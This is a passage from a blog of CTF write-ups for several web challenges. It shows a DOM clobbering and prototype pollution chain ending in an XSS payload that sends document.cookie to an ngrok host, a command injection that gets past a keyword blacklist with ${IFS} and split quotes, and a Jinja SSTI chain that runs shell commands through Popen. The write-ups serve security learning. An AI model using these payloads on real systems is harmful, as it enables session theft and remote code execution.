#EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #C792EA">async</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">firemeup</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">top</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">null;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">facecard</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">top</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #82AAFF">fetch</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">facecard</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">top</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #F07178">())</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">top</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">json</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">facecard</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #FFCB6B">Object</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">assign</span><span style="color: #F07178">(</span><span style="color: #89DDFF">new</span><span style="color: #F07178"> </span><span style="color: #82AAFF">Maker</span><span style="color: #F07178">(</span><span style="color: #FF9CAC">true</span><span style="color: #F07178">)</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">top</span><span style="color: #F07178"> </span><span style="color: #89DDFF">??</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #F07178"> report</span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #FF9CAC">true</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#125;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">body</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #82AAFF">decodeURIComponent</span><span style="color: #F07178">(</span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">Its%20me</span><span style="color: #89DDFF">&#96;</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">facecard</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">report</span><span style="color: #F07178">) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">box</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">getElementById</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">alert</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #C792EA">const</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">newelem</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">document</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">createElement</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">a</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">newelem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">innerHTML</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">Your Resolution</span><span style="color: #89DDFF">&#96;</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">newelem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">href</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&#96;</span><span style="color: #C3E88D">view/RRnYXuQ-hNEOPQpT_E-ey</span><span style="color: #89DDFF">&#96;</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">newelem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">style</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">marginTop</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">10px</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">newelem</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">style</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">display</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">block</span><span style="color: #89DDFF">"</span></div><div class='line'><span style="color: #F07178">                </span><span style="color: #EEFFFF">box</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">appendChild</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">newelem</span><span style="color: #F07178">)</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #F07178">            </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">innerHTML</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">debug</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #89DDFF">!</span><span style="color: #EEFFFF">facecard</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">is_safe</span><span style="color: #F07178">) </span><span style="color: #89DDFF">?</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">body</span><span style="color: #F07178"> </span><span style="color: #89DDFF">:</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">DOMPurify</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">sanitize</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">body</span><span style="color: #F07178">)</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">firemeup</span><span style="color: #EEFFFF">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #F07178">script</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Upon reviewing it closely, we have 2 vulnerability in this code: </p>
<ul><li>HTML Injection. Altough the input is sanitized using <code>Dompurify</code> we can still provide html input. This would lead us to <strong>DOM Clobbering</strong>. We can define an anchor tag with id <code>facecard</code> and execute the code under this condition:</li></ul>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> (window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">facecard</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">top) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #C792EA">let</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #82AAFF">fetch</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">window</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">facecard</span><span style="color: #89DDFF">?.</span><span style="color: #EEFFFF">top</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toString</span><span style="color: #F07178">())</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #EEFFFF">top</span><span style="color: #F07178"> </span><span style="color: #89DDFF">=</span><span style="color: #F07178"> </span><span style="color: #89DDFF">await</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">json</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<ul><li>Prototype Pollution. The <code>top</code> variable value is passed to <code>Object.assign</code> function. If we can provide an object <code>__proto__</code> element, we can modify the created object in our own way.</li></ul>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">const facecard = Object.assign(new Maker(true), top ?? &#123; report: true &#125;);</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Now one challenge here could be that the since we are going to overwrite the value of <code>is_safe</code> attribute, it might not be possible after all since its a private member declared with a <code>#</code> in the beginning. But we can also skip this element providing an prototype leading to an <code>undefined</code> behavior. </p>
<p>So, lets fire up a python server and return a <code>__proto__</code> object:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> json</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">class</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">handle_request</span><span style="color: #89DDFF">(</span><span style="color: #FFCB6B">http</span><span style="color: #89DDFF">.</span><span style="color: #FFCB6B">server</span><span style="color: #89DDFF">.</span><span style="color: #FFCB6B">BaseHTTPRequestHandler</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">_set_headers</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send_response</span><span style="color: #89DDFF">(</span><span style="color: #F78C6C">200</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send_header</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Content-type</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">application/json</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">send_header</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Access-Control-Allow-Origin</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">*</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end_headers</span><span style="color: #89DDFF">()</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">do_GET</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">self</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        response </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">__proto__</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span><span style="color: #EEFFFF">  </span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">report</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">True</span></div><div class='line'><span style="color: #EEFFFF">          </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">_set_headers</span><span style="color: #89DDFF">()</span></div><div class='line'><span style="color: #EEFFFF">        self</span><span style="color: #89DDFF">.</span><span style="color: #F07178">wfile</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">write</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">json</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">dumps</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">response</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">encode</span><span style="color: #89DDFF">())</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">server </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> http</span><span style="color: #89DDFF">.</span><span style="color: #F07178">server</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">HTTPServer</span><span style="color: #89DDFF">((</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">9000</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> handle_request</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">server</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">serve_forever</span><span style="color: #89DDFF">()</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Proxy your server through ngrok or another tool:</p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" bash="true"><div class="language-id">bash</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">$ ngrok http 9000</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>Lets craft our final payload now. Before we do, we still have one thing missing. At the end of the code, the condition to render our payload without using <code>DOMPurify</code> is: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">(window.debug && !facecard.is_safe) ? body : DOMPurify.sanitize(body);</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>In addition, we need to declare another variable on window element which is <code>debug</code>. In the <strong>name</strong> field, we will provide our DOM Clobbering code: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">div</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #C3E88D">debug</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #F07178">div</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">a</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #C3E88D">facecard</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #F07178">a</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">id</span><span style="color: #89DDFF">=</span><span style="color: #C3E88D">facecard</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">name</span><span style="color: #89DDFF">=</span><span style="color: #C3E88D">top</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">href</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">https://de31-101-50-78-56.ngrok-free.app</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">&gt;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>And XSS in the description: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;</span><span style="color: #F07178">img</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">src</span><span style="color: #89DDFF">=</span><span style="color: #C3E88D">x</span><span style="color: #89DDFF"> </span><span style="color: #C792EA">onerror</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">'</span><span style="color: #82AAFF">fetch</span><span style="color: #C3E88D">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">https:</span><span style="color: #546E7A">//de31-101-50-78-56.ngrok-free.app/" + document.cookie)</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF"> /&gt;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>When you submit the details and revisit the resolution page, you will get the flag on your ngrok terminal. </p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/5e230929-31fa-4c09-9cc1-bfe2dba9c653" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<h1 id="finals"><a href="#finals">Finals</a></h1>
<h3 id="jazzme"><a href="#jazzme">JazzME</a></h3>
<p>The challenge had the following description:</p>
<blockquote><p>Taqi is a big fan of Jazz. I made him try my new jazz application.</p></blockquote>
<p>And beleive me Taqi (theflash2k) is only the fan of Jazz Office. </p>
<p>The app is rather simple, if i enter my name, i get it returned in plain. Lets try different payloads. And there’s a hit at command injection: </p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/99cfcbfa-944f-41e2-84dd-31cdf8673ba4" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>Seems we are inside a string and on top of that we are <code>root</code>. Lets read the flag which is prolly sitting in the same directory or at <code>/flag.txt</code>. But it seems there’s a blacklist filtering: </p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/16526814-4af4-42d6-bedc-8dc4daea661c" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>So, lets start putting our command one by one, so we can see what’s allowed and what’s not with the website response. After testing command one by one, the filtered keywords seems to be are <strong>space</strong>, <strong>flag</strong> and <strong>txt</strong> extension. Since, spaces are not allowed, we can also use <code>${IFS}</code> in place of that. </p>
<p>Thats a good start. But we also know that in linux we can provide empty strings within a word. Like <code>fla&quot;&quot;g</code> would be a valid word. Combining these 2 condition, our final payload would look like: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">$</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">cat$</span><span style="color: #89DDFF">&#123;</span><span style="color: #EEFFFF">IFS</span><span style="color: #89DDFF">&#125;/</span><span style="color: #EEFFFF">fla</span><span style="color: #89DDFF">""</span><span style="color: #EEFFFF">g</span><span style="color: #89DDFF">.</span><span style="color: #F07178">t</span><span style="color: #89DDFF">""</span><span style="color: #EEFFFF">xt</span><span style="color: #89DDFF">)</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>And we enter it and we get the flag:
<img src="https://github.com/hash3liZer/khatta/assets/29171692/ee099921-82c2-4a08-a59e-57f688ab9638" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<h3 id="lama"><a href="#lama">Lama</a></h3>
<p>The challenge had the following description: </p>
<blockquote><p>Taqi made a basic web chall, no way you can do this one.</p></blockquote>
<p>Lets visit our application and we found an entry at <code>/robots.txt</code>: </p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/e1e68f55-784e-4f83-961d-2ef41408f90b" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>Lets visit the disallowed URL and it seems to be returning the entered value at the endpoint: </p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/4dc04931-ecf2-4b47-bf79-5fcdc7f61f32" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>Upon sending the request through curl, the server is based on Python and we can try an <code>SSTI</code> here: </p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/a9215dc0-35ea-4023-a599-d659b49220db" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>Enter the payload <code>{{7*7}}</code> returns me the valid response. From here, we have a lot of public writeups available. Our goal is to read the flag inside <code>flag.txt</code> file. First, lets enumerate the <code>object</code> class with: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;&#123;</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()&#125;&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>We find the <code>subprocess.Popen</code> function. But first we need to find its index. You can enumerate it through the url directly by slicing the returned list. Keep repeating the step until you find the right index: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;&#123;</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()[</span><span style="color: #F78C6C">203</span><span style="color: #89DDFF">:]&#125;&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>You can find the index at <code>367</code>:</p>
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/fa9ecdbf-0051-4e23-8d48-6c5f13743fea" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p>
<p>And execute the command: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;&#123;</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()[</span><span style="color: #F78C6C">367</span><span style="color: #89DDFF">](</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">whoami</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF">shell</span><span style="color: #89DDFF">=True,</span><span style="color: #EEFFFF">stdout</span><span style="color: #89DDFF">=-</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">communicate</span><span style="color: #89DDFF">()&#125;&#125;****</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>But while reading the flag, we get the command is filtered. Lets apply the same technique we did in the previous challenge and we get the response <code>Invalid Flag</code>: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;&#123;</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()[</span><span style="color: #F78C6C">367</span><span style="color: #89DDFF">](</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">cat$&#123;IFS&#125;fla""g.t""xt</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF">shell</span><span style="color: #89DDFF">=True,</span><span style="color: #EEFFFF">stdout</span><span style="color: #89DDFF">=-</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">communicate</span><span style="color: #89DDFF">()&#125;&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p>It seems as if the returned response is being also filtered. We can simply cut the first 3 letters and try to capture the flag: </p>
<!-- HTML_TAG_START --><pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;&#123;</span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()[</span><span style="color: #F78C6C">367</span><span style="color: #89DDFF">](</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">cat$&#123;IFS&#125;fla""g.t""xt|cut$&#123;IFS&#125;-b4-</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF">shell</span><span style="color: #89DDFF">=True,</span><span style="color: #EEFFFF">stdout</span><span style="color: #89DDFF">=-</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">communicate</span><span style="color: #89DDFF">()&#125;&#125;</span></div></code></div></pre><!-- HTML_TAG_END -->
<p><img src="https://github.com/hash3liZer/khatta/assets/29171692/6fc7a331-f73f-44a3-8440-dc7c33af692f" alt="image" class="rounded-lg my-2" loading="lazy" decoding="async"></p></main>
    <div class="divider mt-4 mb-0"></div>
      <div><a href="/?tags=pcc23" class="btn btn-sm btn-ghost normal-case mt-2 mr-2 p-category">#pcc23
          </a></div></div>
  
    </article>
    <footer id="footer" class="footer footer-center bg-base-300 text-base-content shadow-inner p-8 md:rounded-box sticky bottom-0 z-0 md:static "><div class="prose"><p><a href="/atom.xml" rel="noopener noreferrer external" target="_blank">Feed</a>
          
        <br>
      Copyright © 2023 - 2024
      @hash3liZer
      <br>
      Powered by
      <a rel="noopener noreferrer external" target="_blank" class="tooltip tooltip-secondary hover:text-secondary" data-tip="🌸 [δ] - Based on MDsveX & SvelteKit 🌸" href="https://github.com/importantimport/urara">Urara
      </a>
      <br>
        <!-- HTML_TAG_START -->Hosted at <a href="https://github.com/hash3liZer/khatta">Khatta</a><!-- HTML_TAG_END --></p></div></footer></div></div></div>


			<script type="application/json" data-sveltekit-fetched data-url="/posts.json">{"status":200,"statusText":"","headers":{},"body":"[{\"title\":\"BlackhatMEA 2024 CTF Writeups for all web challenges (Qualifiers)\",\"tags\":[\"blackhatmea-2024\",\"qualifiers\"],\"categories\":[\"CTF\",\"Writeups\"],\"summary\":\"Writeups for all web related challenges from Blackhat MEA 2024 CTF\",\"created\":\"2024-09-04T00:00:00.000Z\",\"lastmod\":\"2023-09-04T00:00:00.000Z\",\"image\":\"https://github.com/user-attachments/assets/07220c38-8cb9-4961-b1c2-7020b0baa0ad\",\"flags\":[],\"updated\":\"2024-09-29T20:20:13.428Z\",\"slug\":\"/blog/2024/blackhat-mea-24-qualifiers-web-writeups/+page.md\",\"path\":\"/blog/2024/blackhat-mea-24-qualifiers-web-writeups\",\"toc\":[{\"depth\":2,\"title\":\"Watermelon\",\"slug\":\"watermelon\"},{\"depth\":2,\"title\":\"Free Flag\",\"slug\":\"free-flag\"},{\"depth\":2,\"title\":\"Notey\",\"slug\":\"notey\"},{\"depth\":2,\"title\":\"Fastest Delivery Service\",\"slug\":\"fastest-delivery-service\"}],\"type\":\"article\",\"html\":\"\"},{\"title\":\"Setup Fake (Rogue) Access Point WiFi using HostAPD\",\"tags\":null,\"categories\":[\"wireless\",\"rogue-ap\"],\"summary\":\"A detailed guide on how to setup a rogue or fake access point wifi network using 